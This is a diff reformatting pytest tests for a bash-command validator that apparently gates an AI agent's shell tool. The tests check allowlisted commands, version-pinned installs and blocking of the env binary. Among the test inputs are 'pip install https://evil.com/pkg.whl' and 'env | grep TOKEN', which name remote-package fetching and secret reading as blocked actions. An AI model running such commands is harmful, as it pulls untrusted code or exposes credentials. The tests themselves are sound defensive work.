@@ -62,8 +62,7 @@ class TestParseCommands:
         assert "wc" in {c.argv[0] for c in cmds}
 
     def test_loops_and_conditionals(self):
-        cmds = parse_commands(
-            "for f in a b; do cat $f; done; if [ -f x ]; then echo y; fi")
+        cmds = parse_commands("for f in a b; do cat $f; done; if [ -f x ]; then echo y; fi")
         names = [c.argv[0] for c in cmds]
         assert "cat" in names and "[" in names and "echo" in names
         assert "for" not in names and "if" not in names
@@ -120,12 +119,20 @@ class TestParseCommands:
 
 class TestAllowlist:
     def test_common_commands_allowed(self):
-        for cmd in ("ls -la", "git status", "python3 script.py",
-                    "cat f | grep x | sort | uniq -c",
-                    "curl -s https://example.com -o out.json",
-                    "tar czf out.tgz dir/", "make -j4",
-                    "timeout 5 sleep 10", "xargs -I {} cp {} /dest",
-                    "awk '{print $1}' file", "pip list", "npm ls"):
+        for cmd in (
+            "ls -la",
+            "git status",
+            "python3 script.py",
+            "cat f | grep x | sort | uniq -c",
+            "curl -s https://example.com -o out.json",
+            "tar czf out.tgz dir/",
+            "make -j4",
+            "timeout 5 sleep 10",
+            "xargs -I {} cp {} /dest",
+            "awk '{print $1}' file",
+            "pip list",
+            "npm ls",
+        ):
             allowed(cmd)
 
     def test_unknown_executable_blocked(self):
@@ -205,29 +212,23 @@ class TestPackagePolicy:
         allowed("npx cowsay@1.5.0 hi", allow_installs=True)
         allowed("gem install rails -v 7.0.0", allow_installs=True)
         allowed("cargo install ripgrep@14.1.0", allow_installs=True)
-        allowed("go install golang.org/x/tools/cmd/goimports@v0.24.0",
-                allow_installs=True)
+        allowed("go install golang.org/x/tools/cmd/goimports@v0.24.0", allow_installs=True)
         allowed("uv pip install flask==3.0.0", allow_installs=True)
 
     def test_unpinned_installs_blocked_when_enabled(self):
-        blocked("pip install requests", "not version-pinned",
-                allow_installs=True)
-        blocked("pip install requests>=2.0", "not version-pinned",
-                allow_installs=True)
-        blocked("npm install left-pad", "not version-pinned",
-                allow_installs=True)
+        blocked("pip install requests", "not version-pinned", allow_installs=True)
+        blocked("pip install requests>=2.0", "not version-pinned", allow_installs=True)
+        blocked("npm install left-pad", "not version-pinned", allow_installs=True)
         blocked("npx cowsay", "not version-pinned", allow_installs=True)
         blocked("gem install rails", "pinned", allow_installs=True)
         blocked("cargo install ripgrep", "pinned", allow_installs=True)
 
     def test_requirements_files_blocked(self):
-        blocked("pip install -r requirements.txt", "pin-verified",
-                allow_installs=True)
+        blocked("pip install -r requirements.txt", "pin-verified", allow_installs=True)
         blocked("pip install -e .", "pin-verified", allow_installs=True)
 
     def test_urls_and_paths_blocked(self):
-        blocked("pip install git+https://github.com/x/y",
-                allow_installs=True)
+        blocked("pip install git+https://github.com/x/y", allow_installs=True)
         blocked("pip install https://evil.com/pkg.whl", allow_installs=True)
         blocked("pip install ./local-pkg", allow_installs=True)
 
@@ -235,8 +236,11 @@ class TestPackagePolicy:
         blocked("pip install $PKG", "literal", allow_installs=True)
 
     def test_index_url_flag_with_pin_allowed(self):
-        allowed("pip install --index-url https://download.pytorch.org/whl/cu126 "
-                "torch==2.4.0 torchvision==0.19.0", allow_installs=True)
+        allowed(
+            "pip install --index-url https://download.pytorch.org/whl/cu126 "
+            "torch==2.4.0 torchvision==0.19.0",
+            allow_installs=True,
+        )
 
     def test_lockfile_installs_allowed(self):
         allowed("npm ci", allow_installs=True)
@@ -271,24 +275,28 @@ class TestEnvPatternMatchesTheBinaryNotTheFile:
     @staticmethod
     def _reason(cmd):
         import src.mcp.servers.tasks.os.bash.mcp_server as m
+
         return m._validate_bash_command(cmd)
 
     def test_dotenv_files_are_not_the_env_binary(self):
-        for cmd in ("cat .env",
-                    "cat /data/apps/app/.env",
-                    "grep KEY .env.production",
-                    "cp .env.example .env",
-                    "scp app/.env host:/data/apps/app/.env"):
+        for cmd in (
+            "cat .env",
+            "cat /data/apps/app/.env",
+            "grep KEY .env.production",
+            "cp .env.example .env",
+            "scp app/.env host:/data/apps/app/.env",
+        ):
             reason = self._reason(cmd)
-            assert reason is None or "env command" not in reason, \
+            assert reason is None or "env command" not in reason, (
                 f"{cmd!r} refused as env binary: {reason}"
+            )
 
     def test_the_env_binary_is_still_blocked(self):
-        for cmd in ("env", "env | grep TOKEN", "FOO=1 env python x.py",
-                    "/usr/bin/env python3"):
+        for cmd in ("env", "env | grep TOKEN", "FOO=1 env python x.py", "/usr/bin/env python3"):
             reason = self._reason(cmd)
-            assert reason is not None and "env command" in reason, \
+            assert reason is not None and "env command" in reason, (
                 f"{cmd!r} not refused as env binary: {reason}"
+            )
 
     def test_sibling_names_are_not_caught_by_the_lookbehind(self):
         # The lookbehind excludes [\w.\-] before the name, so a filename that
@@ -296,8 +304,9 @@ class TestEnvPatternMatchesTheBinaryNotTheFile:
         # itself is still caught.
         for cmd in ("cat renv.lock", "cat .printenv"):
             reason = self._reason(cmd)
-            assert reason is None or "env command" not in reason, \
+            assert reason is None or "env command" not in reason, (
                 f"{cmd!r} refused as env binary: {reason}"
+            )
         assert "printenv command" in self._reason("printenv HOME")
 
     def test_export_and_process_tools_keep_their_scope(self):
